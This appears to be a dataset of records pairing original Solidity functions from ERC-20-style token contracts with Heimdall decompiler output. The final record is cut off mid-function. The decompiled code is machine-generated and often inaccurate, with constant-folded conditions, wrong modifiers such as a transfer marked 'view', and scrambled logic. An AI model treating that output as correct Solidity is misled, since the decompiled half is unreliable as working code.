{"contract_address": "0x3De5be19D4c2eA5F9c93E556383E286fe2101A96", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        transferDelayEnabled=false;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x08) {\n            if ((0x01 == 0x01) | !0x038d7ea4c68000) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                _maxTxAmount = 0x038d7ea4c68000;\n                if (0x08) {\n                    if ((0x01 == 0x01) | !0x038d7ea4c68000) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        _maxWalletSize = 0x038d7ea4c68000;\n                        transferDelayEnabled = uint248(transferDelayEnabled);\n                        if (0x08) {\n                            if ((0x01 == 0x01) | !0x038d7ea4c68000) {\n                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_f = 0x11;\n                                var_a = 0x038d7ea4c68000;\n                                emit MaxTxAmountUpdated(0x038d7ea4c68000);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x08 > 0xff) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!((0x0a < 0x0b) & (0x08 < 0x4e)) | ((0x0a < 0x0133) & (0x08 < 0x20))) {\n                                                    if (!0x08 > 0x01) {\n                                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                            var_f = 0x11;\n                                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_f = 0x11;\n                                                                if (!0) {\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x6f87c7FAc982eB280d81865547aB31fD209b1637", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner), 0);\n    }"}
{"contract_address": "0xF4DEF1F694801EaBF6f4B4b8b0209E617Bb224e8", "original_solidity_code": "function transfer(address recipient, uint256 amount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public view {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"TOKEN: Max Transaction Limit\");\n        require(address(arg0), \"TOKEN: Max Transaction Limit\");\n        require(arg1 > 0, \"TOKEN: Max Transaction Limit\");\n        require(address(owner) == (address(msg.sender)), \"TOKEN: Max Transaction Limit\");\n        require(!(!(address(owner)) == (address(arg0))), \"TOKEN: Max Transaction Limit\");\n        require(bytes1(uniswapV2Pair / 0x010000000000000000000000000000000000000000), \"TOKEN: Max Transaction Limit\");\n        require(!(arg1 > _maxTxAmount), \"TOKEN: Max Transaction Limit\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x1c;\n        var_d = 0x544f4b454e3a204d6178205472616e73616374696f6e204c696d697400000000;\n        address var_e = address(msg.sender);\n        var_f = 0x10;\n        require(!(!bytes1(storage_map_c[var_e])), \"TOKEN: Your account is blacklisted!\");\n        require(!(bytes1(storage_map_c[var_e])), \"TOKEN: Your account is blacklisted!\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x23;\n        var_d = 0x544f4b454e3a20596f7572206163636f756e7420697320626c61636b6c697374;\n        var_g = 0x6564210000000000000000000000000000000000000000000000000000000000;\n        require(address(uniswapV2Pair) == (address(arg0)), \"Amount must be less than total reflections\");\n        var_e = address(arg0);\n        var_f = 0x02;\n        require(!(storage_map_c[var_e] > store_m), \"Amount must be less than total reflections\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x2a;\n        var_d = 0x416d6f756e74206d757374206265206c657373207468616e20746f74616c2072;\n        var_g = 0x65666c656374696f6e7300000000000000000000000000000000000000000000;\n        uint256 var_h = 0x40 + var_h;\n        var_a = 0x1a;\n        var_i = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x0de0b6b3a7640000, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        uint256 var_g = var_h.length;\n        uint256 var_k = 0;\n        var_l = var_m;\n        var_k = 0;\n        if (0x0de0b6b3a7640000) {\n            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_n = 0x12;\n            require(0x0de0b6b3a7640000, \"TOKEN: This account cannot send tokens until trading is enabled\");\n        }\n        require(address(owner) == (address(msg.sender)), \"TOKEN: This account cannot send tokens until trading is enabled\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x3f;\n        var_d = 0x544f4b454e3a2054686973206163636f756e742063616e6e6f742073656e6420;\n        var_g = 0x746f6b656e7320756e74696c2074726164696e6720697320656e61626c656400;\n        var_e = address(msg.sender);\n        var_f = 0x05;\n        if (storage_map_c[var_e]) {\n            if (storage_map_c[var_e]) {\n                if (!storage_map_c[var_e]) {\n                    if (0) {\n                        if (store_n) {\n                            if (store_n) {\n                            }\n                        }\n                        if (!(address(uniswapV2Pair)) == (address(msg.sender))) {\n                            require(bytes1(storage_map_c[var_e]), \"Transfer amount must be greater than zero\");\n                            require(bytes1(storage_map_c[var_e]), \"Transfer amount must be greater than zero\");\n                            require(!(bytes1(storage_map_c[var_e])), \"Transfer amount must be greater than zero\");\n                            require(0, \"Transfer amount must be greater than zero\");\n                            require(!(address(uniswapV2Pair) == (address(msg.sender))), \"Transfer amount must be greater than zero\");\n                            require(!(address(uniswapV2Pair) == (address(msg.sender))), \"Transfer amount must be greater than zero\");\n                        }\n                    }\n                    require(!(address(uniswapV2Pair) == (address(arg0))), \"Transfer amount must be greater than zero\");\n                }\n                require(!(address(uniswapV2Pair) == (address(arg0))), \"Transfer amount must be greater than zero\");\n            }\n            require(0x01, \"Transfer amount must be greater than zero\");\n        }\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x29;\n        var_d = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_g = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x23;\n        var_d = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x25;\n        var_d = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xB347995c9f8c6C7197370bAFe96967c14F9Fdabe", "original_solidity_code": "function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_a >> 0x01;\n                if (store_a) {\n                    if (store_a - ((store_a >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a >> 0x01) {\n                            if (0x1f < (store_a >> 0x01)) {\n                                var_a = 0x03;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x19d4B93c60e5D7995226F47446e56bD6ac2DDD75", "original_solidity_code": "function removeLimits() external onlyOwner{\n        _maxTxAmount = _tTotal;\n        _maxWalletSize=_tTotal;\n        emit MaxTxAmountUpdated(_tTotal);\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            if ((0x01 == 0x01) | !0x3b9aca00) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                _maxTxAmount = 0x3b9aca00;\n                if (0x09) {\n                    if ((0x01 == 0x01) | !0x3b9aca00) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        _maxWalletSize = 0x3b9aca00;\n                        if (0x09) {\n                            if ((0x01 == 0x01) | !0x3b9aca00) {\n                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_f = 0x11;\n                                var_a = 0x3b9aca00;\n                                emit MaxTxAmountUpdated(0x3b9aca00);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x09 > 0xff) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                                    if (!0x09 > 0x01) {\n                                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                            var_f = 0x11;\n                                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_f = 0x11;\n                                                                if (!0x01) {\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xf06ea21cB6894CC70e2EF280026D5Fc5bEE15421", "original_solidity_code": "function disableStaking() external onlyOwner{\r\n        isStakingAvilable=false;\r\n    }", "heimdall_decompiled_code": "function disableStaking() public payable {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        isStakingAvilable = uint248(isStakingAvilable);\n    }"}
{"contract_address": "0x1e144B971aB5f6Dac1aDE8CF21207EB30041543E", "original_solidity_code": "function setMaxWalletSize(uint256 maxWalletSize) public onlyOwner {\r\n        _maxWalletSize = maxWalletSize;\r\n    }", "heimdall_decompiled_code": "function setMaxWalletSize(uint256 arg0) public {\n        require(arg0 == arg0);\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        _maxWalletSize = arg0;\n    }"}
{"contract_address": "0x8EF34AD921FF8e7D465210EbBe3029fB7B2dd294", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_c) {\n            if (!(store_c) == ((store_c / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_c / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_c / 0x02;\n                if (store_c) {\n                    if (!(store_c) == ((store_c / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_c / 0x02) {\n                            if (0x1f < (store_c / 0x02)) {\n                                var_a = 0x05;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_c / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked(0x20, var_c.length);\n                                        return abi.encodePacked(0x20, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x5c22A66eEf970887AD301Ab39D551F18f756c9f5", "original_solidity_code": "function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_a >> 0x01;\n                if (store_a) {\n                    if (store_a - ((store_a >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a >> 0x01) {\n                            if (0x1f < (store_a >> 0x01)) {\n                                var_a = 0x03;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xc0d5852bF2E95089EcEe1Fb3D3641A7e60073D44", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {return _symbol;}", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_u) {\n            if (store_u - ((store_u >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_u >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_u >> 0x01;\n                if (store_u) {\n                    if (store_u - ((store_u >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_u >> 0x01) {\n                            if (0x1f < (store_u >> 0x01)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_u >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x7ccFBc00423e429844f344aA62D726E3C0DCbfCA", "original_solidity_code": "function transfer(address to, uint256 amount) public returns (bool) {\r\n        _transfer(_msgSender(), to, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(msg.sender);\n        var_b = 0x08;\n        require(infonum - storage_map_b[var_a], \"ERC20: transfer amount exceeds balance\");\n        require(address(msg.sender), \"ERC20: transfer amount exceeds balance\");\n        require(address(arg0), \"ERC20: transfer amount exceeds balance\");\n        var_a = address(msg.sender);\n        var_b = 0x06;\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: transfer amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x26;\n        var_f = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_g = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0x06;\n        require(!((storage_map_b[var_a] - arg1) > storage_map_b[var_a]), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0x06;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_a = address(arg0);\n        require(!(storage_map_b[var_a] > (arg1 + storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = address(arg0);\n        var_b = 0x06;\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        uint256 var_c = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x31218E25Ad864a39c1e3623a1F0e52f2E286E3b4", "original_solidity_code": "function stealthLaunch() external onlyOwner() {\r\n        open = false;\r\n        tradingEnabled = true;\r\n        swapEnabled = true;\r\n    }", "heimdall_decompiled_code": "function stealthLaunch() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        tradingEnabled = 0x0100010000000000000000000000000000000000000000 | (uint232(tradingEnabled));\n    }"}
{"contract_address": "0xeD90409D82B973b1D539F8f5D3e041c387916BbA", "original_solidity_code": "function openTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_e / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x17;\n        var_e = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_d = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_d));\n        require(0x09, \"ERC20: approve to the zero address\");\n        require(!0x3b9aca00 | (0x01 == 0x01), \"ERC20: approve to the zero address\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(address(this) - 0, \"ERC20: approve to the zero address\");\n        require(address(store_d / 0x01) - 0, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x22;\n        var_e = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_f = address(this);\n        var_i = 0x02;\n        var_f = address(store_d / 0x01);\n        address var_i = keccak256(var_f);\n        storage_map_n[var_f] = 0x3b9aca00;\n        var_a = 0x3b9aca00;\n        emit Approval(address(this), address(store_d / 0x01), 0x3b9aca00);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_d / 0x01).factory(var_b); // staticcall\n        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_j == (address(var_j)));\n        var_k = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_d / 0x01).WETH(var_d); // staticcall\n        var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_j == (address(var_j)));\n        var_l = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        address var_h = address(var_j);\n        (bool success, bytes memory ret0) = address(var_j).{ value: 0 ether }Unresolved_c9c65396(var_e); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x24;\n        var_e = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x09 > 0xff) {\n                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_g = 0x11;\n                        if (!0x0200 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                            var_g = 0x11;\n                            if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                if (!0x09 > 0x01) {\n                                    if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_g = 0x11;\n                                        if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                            var_g = 0x11;\n                                            if (!0x01) {\n                                            }\n                                            if (!0x3b9aca00 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_g = 0x11;\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x95f7bFda575e002777B856665bD36D954c3aaa59", "original_solidity_code": "function approveMax(address spender) external returns (bool) {\r\n        return approve(spender, type(uint256).max);\r\n    }", "heimdall_decompiled_code": "function approveMax(address arg0) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(msg.sender);\n        var_b = 0x06;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_j[var_a] = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n        var_c = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n        emit Approval(address(msg.sender), address(arg0), 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);\n        var_c = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0x0cF6AF04E435c22D26884FAd0682E96BA150CBBb", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\\r\\n        return _symbol;\\r\\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_k) {\n            if (store_k - ((store_k / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_k / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_k / 0x02;\n                if (store_k) {\n                    if (store_k - ((store_k / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_k / 0x02) {\n                            if (0x1f < (store_k / 0x02)) {\n                                var_a = 0x69;\n                                var_e = storage_map_d[var_a];\n                                if ((0x20 + var_c) + (store_k / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x3B528BA581ff9f40A13964383470c43062F9857D", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x8d2d07f485Ea0cEf2E843b1EEE5F2237e8e9d013", "original_solidity_code": "function manualBurnLiquidityPairTokens(uint256 percent) external onlyOwner returns (bool){\r\n        require(block.timestamp > lastManualLpBurnTime + manualBurnFrequency , \"Must wait for cooldown to finish\");\r\n        require(percent <= 1000, \"May not nuke more than 10% of tokens in LP\");\r\n        lastManualLpBurnTime = block.timestamp;\r\n        \r\n        // get balance of liquidity pair\r\n        uint256 liquidityPairBalance = this.balanceOf(uniswapV2Pair);\r\n        \r\n        // calculate amount to burn\r\n        uint256 amountToBurn = liquidityPairBalance * percent/10000;\r\n        \r\n        \r\n        if (amountToBurn > 0){\r\n            super._transfer(uniswapV2Pair, address(0xdead), amountToBurn);\r\n        }\r\n        \r\n        //sync price since this is not in a swap transaction!\r\n        IUniswapV2Pair pair = IUniswapV2Pair(uniswapV2Pair);\r\n        pair.sync();\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function manualBurnLiquidityPairTokens(uint256 arg0) public returns (bool) {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(lastManualLpBurnTime > (manualBurnFrequency + lastManualLpBurnTime)), \"Must wait for cooldown to finish\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(block.timestamp > (manualBurnFrequency + lastManualLpBurnTime), \"Must wait for cooldown to finish\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4d757374207761697420666f7220636f6f6c646f776e20746f2066696e697368;\n        require(!(arg0 > 0x03e8), \"May not nuke more than 10% of tokens in LP\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x2a;\n        var_d = 0x4d6179206e6f74206e756b65206d6f7265207468616e20313025206f6620746f;\n        var_g = 0x6b656e7320696e204c5000000000000000000000000000000000000000000000;\n        lastManualLpBurnTime = block.timestamp;\n        var_a = 0x70a0823100000000000000000000000000000000000000000000000000000000;\n        var_b = 0xc7af915962dac099a28b9fd0ed5efd49f9857c5a;\n        (bool success, bytes memory ret0) = address(this).Unresolved_70a08231(var_b); // staticcall\n        uint256 var_h = var_h + (uint248(ret0.length + 0x1f));\n        require(!(((var_h + ret0.length) - var_h) < 0x20), \"ERC20: transfer from the zero address\");\n        require((arg0 == ((arg0 * var_h.length) / var_h.length)) | !var_h.length, \"ERC20: transfer from the zero address\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x2710, \"ERC20: transfer from the zero address\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        require(!((arg0 * var_h.length) / 0x2710), \"ERC20: transfer from the zero address\");\n        